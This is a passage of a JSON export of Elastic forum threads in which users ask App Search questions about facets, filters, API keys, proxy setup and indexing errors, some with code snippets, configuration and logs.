    "body": "Hi can anyone advice how I can centralise my results and beautify the results component. For some reason, my appSearch isn’t dynamic. Meaning to say I have to refresh my page back to localhost:3000 (without any query) before the responses in my UI go back to normal. Just changing my search term in the search bar doesn’t give a different result. I’m following the swiftType documentation but it’s my firstTime using it. Not very familiar (edited) Screenshot 2020-04-20 at 2.40.02 AM781×238 21.8 KB Screenshot 2020-04-20 at 2.40.19 AM1887×473 63.9 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f69a1919-bfd5-4df1-a5a8-cbe4822792bb",
    "url": "https://discuss.elastic.co/t/multicheckbox-facet-query/228527",
    "title": "Multicheckbox Facet Query",
    "category": [
      "App Search"
    ],
    "author": "Rohit_Kumar",
    "date": "April 17, 2020, 1:50pm April 17, 2020, 2:05pm April 17, 2020, 2:06pm April 17, 2020, 2:12pm April 17, 2020, 2:52pm April 17, 2020, 3:04pm",
    "body": "Hi guys, I am using the MultiCheckboxFacet for facet . By default it allows us to select multi chekboxes for filtering results, but i have some situation that i only wanted to allow single selected checkbox. i.e After click on second checkbox , first should be remove and results should be filter as per selected checkbox value. Please suggest the best way to do this",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "0fd71bf5-f20a-42b0-8af0-8fd9c315b242",
    "url": "https://discuss.elastic.co/t/how-to-manage-index-lifecycle-in-appsearch/225512",
    "title": "How to manage index lifecycle in AppSearch?",
    "category": [
      "App Search"
    ],
    "author": "",
    "date": "March 28, 2020, 10:19pm April 3, 2020, 1:03am April 3, 2020, 4:33pm April 7, 2020, 12:07am April 16, 2020, 10:05pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "313d3045-79a2-457f-bc0e-4c3a75176833",
    "url": "https://discuss.elastic.co/t/maximum-number-of-authentication-keys/227920",
    "title": "Maximum number of authentication keys",
    "category": [
      "App Search"
    ],
    "author": "malik_aditya",
    "date": "April 14, 2020, 1:16pm",
    "body": "Hi just wanted to know is there a limit to the number of authentication key?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a30f3856-7520-4212-9e11-cbff608c051c",
    "url": "https://discuss.elastic.co/t/get-elastic-search-document-id-and-engine-id/227662",
    "title": "Get elastic search document ID and Engine ID",
    "category": [
      "App Search"
    ],
    "author": "wickerman",
    "date": "April 12, 2020, 9:54am April 13, 2020, 12:41pm April 13, 2020, 1:14pm April 13, 2020, 1:19pm",
    "body": "Hello, I'm currently learning AppSearch so that I can use it for a certain project. So far so good, but I've hit a wall. One thing I know is that AppSearch indexes documents to elasticsearch. But I find AppSearch to be more opinionated in terms of how flexible you'll be with the documents. For context sake, my use case is as below. We index different products using AppSearch because it does a lot of the hard work for us in the background when creating mappings and documents into elasticsearch. But you cannot run more advanced queries through appsearch like you would with elasticsearch. Consider a query like this that is meant to find documents that are like the document with _id: xxxxx from a certain _index: xxxxxxx: kibana_1779×310 23.9 KB From the results, I see that AppSearch actually has the engine_id and the id of the document as indexed into elasticsearch. As seen Here from field id and engine_id: Now that you have an idea of the nature of my problem, My question is: How can Retrieve the engine_id and id of the document so that I can reuse the same indices and ids from elasticsearch to run more complex queries? Thank you.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ede33ba3-4967-45e3-a0e6-be1aa6f1251c",
    "url": "https://discuss.elastic.co/t/random-score-is-available-on-app-search/226764",
    "title": "Random_score is available on App Search?",
    "category": [
      "App Search"
    ],
    "author": "gpribi",
    "date": "April 6, 2020, 7:16pm April 8, 2020, 12:43pm April 11, 2020, 12:08am April 13, 2020, 12:45pm",
    "body": "Hello, I'm trying to get a randomized result using App Search, but I can't find a way to archieve that. I've seen that ElasticSearch does include a random score option (https://www.elastic.co/guide/en/elasticsearch/guide/current/random-scoring.html) Is there any way to access to that feature? Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "69be4ce6-0d04-432b-ba9c-736a80f0757e",
    "url": "https://discuss.elastic.co/t/i-can-access-facet-data-but-how-do-i-update-it-after-selections-are-made/226781",
    "title": "I can access facet data, but how do I update it after selections are made?",
    "category": [
      "App Search"
    ],
    "author": "claytonzaugg",
    "date": "April 6, 2020, 9:20pm April 13, 2020, 12:26pm",
    "body": "Following the guide here I've created the following search request: api_search_builder(query_parameters) { check(query_parameters, { call_type: String, query: String, page: { current: Number, size: Number, }, }); // avoid blocking other method calls from the same client this.unblock(); const query_to_array = []; const query_array = query_parameters.query.split(' '); const query_array_count = query_array.length; for (let i = 0; i < query_array_count; i++) { query_to_array[i] = `${query_array[i]}`; } const query = query_to_array.join(' AND '); const data = { query, page: { current: query_parameters.page.current, size: query_parameters.page.size, }, facets: { leaf_class: [{ type: 'value', sort: { count: 'desc', }, size: 10, }], product_type: [{ type: 'value', sort: { count: 'desc', }, size: 10, }], brand_name: [{ type: 'value', sort: { count: 'desc', }, size: 10, }], }, }; const headers_and_data = { headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${search_api_key}` }, data }; let complete_api_url = api_url; if (query_parameters.call_type === 'search_settings' || query_parameters.call_type === 'search' || query_parameters.call_type === 'multi_search') { complete_api_url = `${api_url}${query_parameters.call_type}/?`; } return HTTP.post(complete_api_url, headers_and_data); }, But I don't see in the guide how to refine the search more once someone starts clicking on facet options (like color, size, shapet, etc) Please advise if you require anything further from me to help identify my challenge. Thank you",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b81bd793-e653-49c3-b2b2-2c9835b3894e",
    "url": "https://discuss.elastic.co/t/is-reference-ui-react-required-to-filter-results-when-users-click-facet-checkboxes/226808",
    "title": "Is Reference UI / React required to filter results when users click facet checkboxes?",
    "category": [
      "App Search"
    ],
    "author": "claytonzaugg",
    "date": "April 7, 2020, 2:14am April 13, 2020, 12:27pm",
    "body": "I have a pre-existing site built with MeteorJS which is built on NodeJS and I don't use React for this particular project. So I find myself trying to understand React enough to implement into my project, but I'm not finding any event listeners I can console log to see what's happening, nor can I see where HTTP get or post is happening. With my meteor app, I can actually send search queries and get the results and even display the facet data I've requested, I just can't find in the guides or documents how I make the action work when someone clicks one of the checkboxes of a facet. Like I said, I looked in the downloadable example code and didn't see any event functions that send a get or post back to Elastic, so I'm kind of stuck not knowing how to filter results when users select differing boxes to refine their results. Please let me know if you need anymore information from me or if I need to explain anything more clearly. Thank you!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "84870994-9acf-4ae8-b625-5ad8b6fa988a",
    "url": "https://discuss.elastic.co/t/app-search-cluster/226615",
    "title": "App Search cluster",
    "category": [
      "App Search"
    ],
    "author": "alexHong",
    "date": "April 6, 2020, 5:03am",
    "body": "hi, I'm new to App Search and wondering is there any way that we can create a cluster with multiple nodes of App Search? In case if one node is down there is no downtime for App Search. Like how we have a cluster for Elastic Search? TIA!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d1b18398-2c5f-4cef-a1b1-732c09ef5651",
    "url": "https://discuss.elastic.co/t/delete-all-documents/226326",
    "title": "Delete all documents",
    "category": [
      "App Search"
    ],
    "author": "malik_aditya",
    "date": "April 3, 2020, 5:24am",
    "body": "Hi is there any way for me to delete all the documents in an index before indexing into it again?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "91935e60-ec00-4e73-90f6-efb6ca13b1af",
    "url": "https://discuss.elastic.co/t/range-based-query-on-number-type/225763",
    "title": "Range based query on number type",
    "category": [
      "App Search"
    ],
    "author": "nathanwfish",
    "date": "March 30, 2020, 11:37pm March 31, 2020, 12:11pm March 31, 2020, 3:58pm April 1, 2020, 10:50pm",
    "body": "My schema includes field \"mileage\" with a type set to \"number\". When I run a query like the following, I get all documents, not just those in the range. { \"query\":\"\", \"filters\": { \"mileage\": { \"from\": 0, \"to\": 40000 } } } Is there something I'm missing? I'm referencing the following documentation. Swiftype Filters | Swiftype Documentation Learn how to get the most out of Swiftype How I set up the index. I imported the documents first through the JSON API. I then set the field type for the mileage and some other fields from the app search UI. Do I need to re-import all my documents to get the field type to be indexed properly?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "da41d2fb-9c3f-464d-b482-3df2620c9a05",
    "url": "https://discuss.elastic.co/t/e-commerce-variants-handling/225914",
    "title": "e-Commerce Variants Handling",
    "category": [
      "App Search"
    ],
    "author": "Philipp_Loew-Albrech",
    "date": "March 31, 2020, 4:28pm",
    "body": "Hi there, We have pretty standard requriements for e-commerce, but currently I see that it looks like App Search isn't capable of providing a proper solution, since it's not supporting nested objects? Let's say we have a nike shoe. There are variants for: Sex: Man / Woman Size: 4;4,5 ... 13 Color: Black, White, Yellow, etc. Price: .. Currently we are using nested objects and \"hit\" for this variant handling / querying. Of course we don't want to provide white shoes after user filtered for color:black, what seems to me not working without a nested object handling? I don't see how we could achieve this type of search in one index (we could add two index like one for all products and another for all variants, but this is misusage of ES). So is this standard task already too advanced for app search? Or do I just don't see the way to work with this? Thanks! Philipp",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "15a0cfaf-ef7c-4df4-ae82-ac443ff69734",
    "url": "https://discuss.elastic.co/t/help-setting-up-filebeat-selfhosted/223044",
    "title": "Help setting up filebeat? (Selfhosted)",
    "category": [
      "App Search"
    ],
    "author": "varunharidas",
    "date": "March 11, 2020, 5:40am March 12, 2020, 11:56am March 12, 2020, 11:58am March 12, 2020, 2:39pm March 12, 2020, 2:40pm March 12, 2020, 3:27pm March 12, 2020, 4:54pm March 13, 2020, 9:27am March 30, 2020, 3:38am March 30, 2020, 3:38am",
    "body": "Everything else is working fine however can't find any guide to configuring filebeat for app search, I found a filebeat.yml file inside the app search folder, but no idea in setting it up. Already have file beat up and running using the config from /etc/filebeat/filebeat.yml. Pelase help!",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "21936408-e46f-438e-9c95-837cd82fe414",
    "url": "https://discuss.elastic.co/t/work-with-geolocation/215242",
    "title": "Work with GeoLocation",
    "category": [
      "App Search"
    ],
    "author": "malik_aditya",
    "date": "January 16, 2020, 11:32am January 16, 2020, 11:36am January 16, 2020, 11:36am January 17, 2020, 1:19pm January 17, 2020, 1:20pm March 28, 2020, 10:01am",
    "body": "Hi. I'm trying to implement the near me feature using geolocation type field. However i don't see any documentation regarding quering using geolocation, so if you can please help me or just point to the right documentation, that'll be great.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "42985c59-40f9-4dc0-8fc8-4e5939658497",
    "url": "https://discuss.elastic.co/t/app-search-failed-to-connect-to-elasticsearch-backup/222716",
    "title": "App-Search failed to connect to Elasticsearch backup",
    "category": [
      "App Search"
    ],
    "author": "",
    "date": "March 9, 2020, 1:35pm March 27, 2020, 2:40pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "11da4bf5-5994-45a0-8132-1541ea55e8a9",
    "url": "https://discuss.elastic.co/t/app-search-not-able-to-connect-to-elasticsearch-directly-over-https/224070",
    "title": "App search not able to connect to elasticsearch directly over https",
    "category": [
      "App Search"
    ],
    "author": "Jaaved_Ali_Khan",
    "date": "March 18, 2020, 10:36am March 19, 2020, 1:09pm March 27, 2020, 2:35pm March 27, 2020, 2:35pm",
    "body": "app search and elasticsearch are on same machine; I tried with both 7.5.2 and 7.6.1 versions of elasticsearch and app search. allow_es_settings_modification: true elasticsearch.host: \"https://kombare-es.com\" elasticsearch.username: \"{{ elasticsearch_username }}\" elasticsearch.password: \"{{ elasticsearch_password }}\" elasticsearch.ssl.enabled: true elasticsearch.ssl.verify: false app_search.external_url: https://localhost:9200 app_search.auth.source: elasticsearch-native when I am using elasticsearch.host: \"https://kombare-es.com\" elasticsearch.ssl.verify: false App search is starting, but not creating indexes, as I explained here Not able to index documents using app search(7.6.1). I am suspecting that may be reverse proxy, nginx, is responsible for this, took hint from here: Issue with app search (download) release -- not quite a connection issue. I want to try connecting app search directly, without nginx, to elasticsearch, however when I am using elasticsearch.host: \"https://localhost:9200\" # or elasticsearch.host: \"https://127.0.0.1:9200\" elasticsearch.ssl.verify: false app search is not starting with error: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target looks like app search is neglecting the settings elasticsearch.ssl.verify: false when I am using localhost or 127.0.0.1",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "04b3d9e5-5b33-4881-a572-f514b95f156b",
    "url": "https://discuss.elastic.co/t/total-documents-count-in-a-certain-engine/222310",
    "title": "Total documents count in a certain engine",
    "category": [
      "App Search"
    ],
    "author": "JyL",
    "date": "March 5, 2020, 2:19pm March 5, 2020, 2:48pm March 5, 2020, 8:35pm March 9, 2020, 6:17pm March 10, 2020, 10:34am March 10, 2020, 12:59pm March 10, 2020, 3:01pm March 10, 2020, 3:04pm March 27, 2020, 2:33pm",
    "body": "Hi, I am working on pushing data to app-search in a certain engine, i could see documents get created in the API Logs but the total number of the documents doesn't get increased. Is there a API that I could create a RESTful request to see the total number of documents? or what is the issue there? Thanks, JL",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "5e5eb411-7b20-4a95-8b31-be4fa61434a8",
    "url": "https://discuss.elastic.co/t/how-to-hide-selfhosted-app-search-dashboard-production/224631",
    "title": "How to hide selfhosted app search dashboard - production",
    "category": [
      "App Search"
    ],
    "author": "varunharidas",
    "date": "March 23, 2020, 9:29am March 27, 2020, 3:04am March 27, 2020, 2:24pm",
    "body": "Noob alert. My app search installation is lying on foo.bar.com- making reqs from client-side, how can I hide the app search dashboard from the public. I have proxy passed foo.bar.com using Nginx",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bf85aceb-1ec5-4ce2-9c76-8fd56167c2db",
    "url": "https://discuss.elastic.co/t/do-api-keys-expire/225161",
    "title": "Do API keys expire?",
    "category": [
      "App Search"
    ],
    "author": "malik_aditya",
    "date": "March 27, 2020, 2:25pm March 26, 2020, 12:07pm March 26, 2020, 12:08pm",
    "body": "Hi I wanted to know is there a life on these keys ( public/private/self-signed/admin)",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fb2a7d83-4ef2-4e3e-833e-11dab57fb551",
    "url": "https://discuss.elastic.co/t/i-want-to-increase-the-number-of-filters-that-can-be-applied/224357",
    "title": "I want to increase the number of filters that can be applied",
    "category": [
      "App Search"
    ],
    "author": "sikeeoh",
    "date": "March 20, 2020, 6:10am March 26, 2020, 12:01pm",
    "body": "I send the id of the product I need to search for, but this is 70,000. but app search limit 32,768 Is there any way to increase from 32768? ARRAYS VS. OBJECTS Be mindful of the 32 filters limit when building large filtered queries. Instead of stacking objects, you can use an array when values share a field. Each array can contain 1024 values. If need be, you can use 32 full arrays to filter on a total of 32,768 values.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5d9eaa86-a510-4b24-8a63-5929f5afe6c1",
    "url": "https://discuss.elastic.co/t/an-unexpected-error-occurred-cannot-convert-undefined-or-null-to-object/224946",
    "title": "An unexpected error occurred: Cannot convert undefined or null to object",
    "category": [
      "App Search"
    ],
    "author": "Swapnil_Ghorpade",
    "date": "March 25, 2020, 6:54am March 25, 2020, 11:34am April 22, 2020, 11:34am",
    "body": "PFA @JasonStoltz is it because of facets are not in search response? if yes then how to handle it ? Screen Shot 2020-03-25 at 12.15.52 PM1416×385 38.6 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "db5fcdec-d265-4311-b0f3-7121980f1390",
    "url": "https://discuss.elastic.co/t/not-able-to-index-documents-using-app-search-7-6-1/222893",
    "title": "Not able to index documents using app search(7.6.1)",
    "category": [
      "App Search"
    ],
    "author": "Jaaved_Ali_Khan",
    "date": "March 10, 2020, 11:03am March 10, 2020, 9:29am March 10, 2020, 9:53am March 10, 2020, 12:43pm March 10, 2020, 12:49pm March 10, 2020, 3:03pm March 10, 2020, 4:08pm March 10, 2020, 5:53pm March 11, 2020, 6:07am March 12, 2020, 6:13am March 12, 2020, 8:31am March 12, 2020, 10:22am March 13, 2020, 10:32am March 16, 2020, 9:20am March 17, 2020, 8:32pm March 20, 2020, 1:30pm March 20, 2020, 2:55pm March 27, 2020, 2:35pm March 20, 2020, 3:28pm April 17, 2020, 3:28pm",
    "body": "I was able successfully install app search on linux(ubuntu) with nginx as reverse proxy to app search, my configs are: Nginx: upstream kombare-search { server 127.0.0.1:3002; keepalive 15; } server { server_name kombare-search.com; listen 80; location / { proxy_pass http://kombare-search; } } app-search.yml: allow_es_settings_modification: true elasticsearch.username: \"{{ elasticsearch_username }}\" elasticsearch.password: \"{{ elasticsearch_password }}\" elasticsearch.ssl.enabled: true elasticsearch.ssl.verify: false app_search.external_url: \"{{ app_search_external_url }}\" app_search.auth.source: elasticsearch-native When I am indexing documents - tried indexing with python API, curl, and paste json - they are not getting created. e.g. with \"Paste json\" option image1218×596 25.7 KB result: image837×442 20.5 KB Might be relevant bits from log: Failed [2020-03-10T09:07:34.032+00:00][8913][2290][app-server][WARN]: Failed to claim job cb95b7d95a1c24fcaa243d5591cf7711c13c3c20, claim conflict occurred [2020-03-10T09:07:34.032+00:00][8913][2286][app-server][WARN]: Failed to claim job cb95b7d95a1c24fcaa243d5591cf7711c13c3c20, claim conflict occurred Error: [2020-03-10T09:07:34.191+00:00][8913][2288][app-server][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Re-queueing Work::Engine::IndexAdder for engine 5e674d49f1f1792522921019 document **[\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"] in 60 seconds. Reason: Transient HTTP error** Log generated in response to \"paste json\", detailed log: [2020-03-10T09:07:33.021+00:00][8913][2310][action_controller][INFO]: [5c2b4ba7-aa47-4d58-9fef-5af44147fcf0] Processing by LocoMoco::DocumentsController#create as JSON [2020-03-10T09:07:33.023+00:00][8913][2310][action_controller][INFO]: [5c2b4ba7-aa47-4d58-9fef-5af44147fcf0] Parameters: {\"documents\"=>[{\"id\"=>\"park_rocky-mountain\", \"title\"=>\"Rocky Mountain\", \"description\"=>\"Bisected north to south by the Continental Divide, this portion of the Rockies has ecosystems varying from over 150 riparian lakes to montane and subalpine forests to treeless alpine tundra. Wildlife including mule deer, bighorn sheep, black bears, and cougars inhabit its igneous mountains and glacial valleys. Longs Peak, a classic Colorado fourteener, and the scenic Bear Lake are popular destinations, as well as the historic Trail Ridge Road, which reaches an elevation of more than 12,000 feet (3,700 m).\", \"nps_link\"=>\"https://www.nps.gov/romo/index.htm\", \"states\"=>[\"Colorado\"], \"visitors\"=>4517585, \"world_heritage_site\"=>false, \"location\"=>\"40.4,-105.58\", \"acres\"=>265795.2, \"square_km\"=>1075.6, \"date_established\"=>\"1915-01-26T06:00:00Z\"}, {\"id\"=>\"park_saguaro\", \"title\"=>\"Saguaro\", \"description\"=>\"Split into the separate Rincon Mountain and Tucson Mountain districts, this park is evidence that the dry Sonoran Desert is still home to a great variety of life spanning six biotic communities. Beyond the namesake giant saguaro cacti, there are barrel cacti, chollas, and prickly pears, as well as lesser long-nosed bats, spotted owls, and javelinas.\", \"nps_link\"=>\"https://www.nps.gov/sagu/index.htm\", \"states\"=>[\"Arizona\"], \"visitors\"=>820426, \"world_heritage_site\"=>false, \"location\"=>\"32.25,-110.5\", \"acres\"=>91715.72, \"square_km\"=>371.2, \"date_established\"=>\"1994-10-14T05:00:00Z\"}], \"dry_run\"=>true, \"host\"=>\"kombare-search.com\", \"protocol\"=>\"http\", \"engine_slug\"=>\"sp\"} [2020-03-10T09:07:33.128+00:00][8913][2310][app-server][INFO]: [5c2b4ba7-aa47-4d58-9fef-5af44147fcf0] Engine[5e674d49f1f1792522921019]: Adding a batch of 2 documents to the index asynchronously [2020-03-10T09:07:33.137+00:00][8913][2310][app-server][INFO]: [5c2b4ba7-aa47-4d58-9fef-5af44147fcf0] [ActiveJob] Enqueueing a job into the '.app-search-esqueues-me_queue_v1_index_adder' index. {\"job_type\"=>\"ActiveJob::QueueAdapters::EsqueuesMeAdapter::JobWrapper\", \"payload\"=>{\"args\"=>[{\"job_class\"=>\"Work::Engine::IndexAdder\", \"job_id\"=>\"cb95b7d95a1c24fcaa243d5591cf7711c13c3c20\", \"queue_name\"=>\"index_adder\", \"arguments\"=>[\"5e674d49f1f1792522921019\", [\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"]], \"locale\"=>:en, \"executions\"=>1}]}, \"status\"=>\"pending\", \"created_at\"=>1583831253136, \"perform_at\"=>1583831253136, \"attempts\"=>0} [2020-03-10T09:07:33.159+00:00][8913][2310][active_job][INFO]: [5c2b4ba7-aa47-4d58-9fef-5af44147fcf0] [ActiveJob] [2020-03-10 09:07:33 UTC] enqueued Work::Engine::IndexAdder job (cb95b7d95a1c24fcaa243d5591cf7711c13c3c20) on `index_adder` [2020-03-10T09:07:33.161+00:00][8913][2310][active_job][INFO]: [5c2b4ba7-aa47-4d58-9fef-5af44147fcf0] [ActiveJob] Enqueued Work::Engine::IndexAdder (Job ID: cb95b7d95a1c24fcaa243d5591cf7711c13c3c20) to EsqueuesMe(index_adder) with arguments: \"5e674d49f1f1792522921019\", [\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"] [2020-03-10T09:07:33.165+00:00][8913][2310][action_controller][INFO]: [5c2b4ba7-aa47-4d58-9fef-5af44147fcf0] Completed 200 OK in 140ms (Views: 1.1ms) [2020-03-10T09:07:34.032+00:00][8913][2290][app-server][WARN]: Failed to claim job cb95b7d95a1c24fcaa243d5591cf7711c13c3c20, claim conflict occurred [2020-03-10T09:07:34.032+00:00][8913][2286][app-server][WARN]: Failed to claim job cb95b7d95a1c24fcaa243d5591cf7711c13c3c20, claim conflict occurred [2020-03-10T09:07:34.042+00:00][8913][2288][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Performing Work::Engine::IndexAdder from EsqueuesMe(index_adder) with arguments: \"5e674d49f1f1792522921019\", [\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"] [2020-03-10T09:07:34.043+00:00][8913][2288][app-server][INFO]: [ActiveJob] **[Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Bulk-indexing 2 documents...** [2020-03-10T09:07:34.076+00:00][8913][2288][app-server][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Adding documents [\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"] to index for engine 5e674d49f1f1792522921019 [2020-03-10T09:07:34.191+00:00][8913][2288][app-server][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Re-queueing Work::Engine::IndexAdder for engine 5e674d49f1f1792522921019 document **[\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"] in 60 seconds. Reason: Transient HTTP error** [2020-03-10T09:07:34.194+00:00][8913][2288][app-server][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Enqueueing a job into the '.app-search-esqueues-me_queue_v1_index_adder' index. {\"job_type\"=>\"ActiveJob::QueueAdapters::EsqueuesMeAdapter::JobWrapper\", \"payload\"=>{\"args\"=>[{\"job_class\"=>\"Work::Engine::IndexAdder\", \"job_id\"=>\"cb95b7d95a1c24fcaa243d5591cf7711c13c3c20\", \"queue_name\"=>\"index_adder\", \"arguments\"=>[\"5e674d49f1f1792522921019\", [\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"]], \"locale\"=>:en, \"executions\"=>1}]}, \"status\"=>\"pending\", \"created_at\"=>1583831254193, \"perform_at\"=>1583831314192, \"attempts\"=>0} [2020-03-10T09:07:34.200+00:00][8913][2288][app-server][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Ignoring duplicate job class=Work::Engine::IndexAdder, id=cb95b7d95a1c24fcaa243d5591cf7711c13c3c20, args=[\"5e674d49f1f1792522921019\", [\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"]] [2020-03-10T09:07:34.200+00:00][8913][2288][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] [2020-03-10 09:07:34 UTC] enqueued Work::Engine::IndexAdder job (cb95b7d95a1c24fcaa243d5591cf7711c13c3c20) on `index_adder` [2020-03-10T09:07:34.202+00:00][8913][2288][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Enqueued Work::Engine::IndexAdder (Job ID: cb95b7d95a1c24fcaa243d5591cf7711c13c3c20) to EsqueuesMe(index_adder) at 2020-03-10 09:08:34 UTC with arguments: \"5e674d49f1f1792522921019\", [\"5e674fd9f1f179252292101f\", \"5e674fd9f1f1792522921020\"] [2020-03-10T09:07:34.203+00:00][8913][2288][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] [2020-03-10 09:07:34 UTC] completed Work::Engine::IndexAdder job (cb95b7d95a1c24fcaa243d5591cf7711c13c3c20) on `index_adder` [2020-03-10T09:07:34.204+00:00][8913][2288][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [cb95b7d95a1c24fcaa243d5591cf7711c13c3c20] Performed Work::Engine::IndexAdder from EsqueuesMe(index_adder) in 161.42ms [2020-03-10T09:07:34.205+00:00][8913][2288][app-server][INFO]: Deleting: {:index=>\".app-search-esqueues-me_queue_v1_index_adder\", :type=>nil, :id=>\"cb95b7d95a1c24fcaa243d5591cf7711c13c3c20\", :if_primary_term=>1, :if_seq_no=>19} [2020-03-10T09:07:35.735+00:00][8913][2294][app-server][INFO]: [6c2fa469-cd71-45b2-bd20-4c2e3ef709c9] Started POST \"/as/engines/sp/documents.json?query=\" for 127.0.0.1 at 2020-03-10 09:07:35 +0000 [2020-03-10T09:07:35.739+00:00][8913][2294][action_controller][INFO]: [6c2fa469-cd71-45b2-bd20-4c2e3ef709c9] Processing by LocoMoco::DocumentsController#index as JSON [2020-03-10T09:07:35.739+00:00][8913][2294][action_controller][INFO]: [6c2fa469-cd71-45b2-bd20-4c2e3ef709c9] Parameters: {\"page\"=>{\"current\"=>1}, \"query\"=>\"\", \"host\"=>\"kombare-search.com\", \"protocol\"=>\"http\", \"engine_slug\"=>\"sp\"} [2020-03-10T09:07:35.853+00:00][8913][2294][action_controller][INFO]: [6c2fa469-cd71-45b2-bd20-4c2e3ef709c9] Completed 200 OK in 113ms (Views: 0.5ms) [2020-03-10T09:07:41.012+00:00][8913][2312][app-server][INFO]: [40bd5f48-d72e-4b47-abe2-c76aaa0d518e] Started POST \"/as/engines/sp/documents.json?query=\" for 127.0.0.1 at 2020-03-10 09:07:41 +0000",
    "website_area": "discuss",
    "replies": 20
  },
  {
    "id": "78e509ae-1547-4790-ad7e-e4dd9cda10c4",
    "url": "https://discuss.elastic.co/t/any-plans-for-aggregation-queries-sum/224182",
    "title": "Any plans for aggregation queries (SUM)?",
    "category": [
      "App Search"
    ],
    "author": "Alexandre_Boucher",
    "date": "March 18, 2020, 7:49pm March 19, 2020, 11:41am March 19, 2020, 11:55am March 19, 2020, 12:08pm March 19, 2020, 12:33pm March 20, 2020, 1:38pm April 17, 2020, 1:38pm",
    "body": "I am currently using Algolia and am interested in App Search. However, one important feature from Algolia that my team need is the aggregation feature done on facets (especially the sum feature). My use case is I search items, each one having a price associated to it, and need the sum of results' price when displaying results. Is there any plan to have this available in App Search soon? Or is there a way to achieve it with the current feature set? I can't seem to find anything on it... Do you have any suggestion? Thanks for your help.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b230687f-c648-4f86-a391-6a4462686255",
    "url": "https://discuss.elastic.co/t/error-on-parallel-index-calls-with-the-same-id-unable-to-save-document/221826",
    "title": "Error on parallel index calls with the same id \"Unable to save document\"",
    "category": [
      "App Search"
    ],
    "author": "alexp0205",
    "date": "March 3, 2020, 7:52am March 12, 2020, 11:50am March 13, 2020, 6:56am April 10, 2020, 6:56am",
    "body": "URL - /api/as/v1/engines/{engine-name}/documents Method - POST Client - elastic-app-search==7.6.0 (Python) I am making 4 index document calls with the same document body (with id). On these first 2-3 calls are failing and the final 1-2 succeeds. In case of failure, the API returns 200 response, but the response body is [ { \"id\": \"144\", \"errors\": [ \"Unable to save document\" ] } ] Why could this be happening?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0a207852-9438-49ad-b7e1-2ba94bf2a2ba",
    "url": "https://discuss.elastic.co/t/search-query-returning-a-different-result-instead-of-following-the-query/223268",
    "title": "Search query returning a different result instead of following the query",
    "category": [
      "App Search"
    ],
    "author": "varunharidas",
    "date": "March 12, 2020, 7:27am March 12, 2020, 2:44pm March 12, 2020, 2:44pm March 12, 2020, 2:49pm April 9, 2020, 2:46pm",
    "body": "I'm trying to search joseph sunny but when I type and reach joseph sun I'm getting this result which finds a person with just sun in the name field. See the screenshots for clarity - running self-hosted. When i type joseph sunny completely b30e40582faf649a644438329be9b521adee86c82142×1120 195 KB When I reach joseph sun 6397dda24defc0998424c6cccdbdf239a418b2b51284×1100 75 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3ef4dab2-7413-4be9-aec2-1dd36a2f9b9b",
    "url": "https://discuss.elastic.co/t/efficient-searching-for-email-addresses/222758",
    "title": "Efficient searching for email addresses?",
    "category": [
      "App Search"
    ],
    "author": "Iconeer",
    "date": "March 9, 2020, 3:49pm March 10, 2020, 10:41am April 7, 2020, 10:40am",
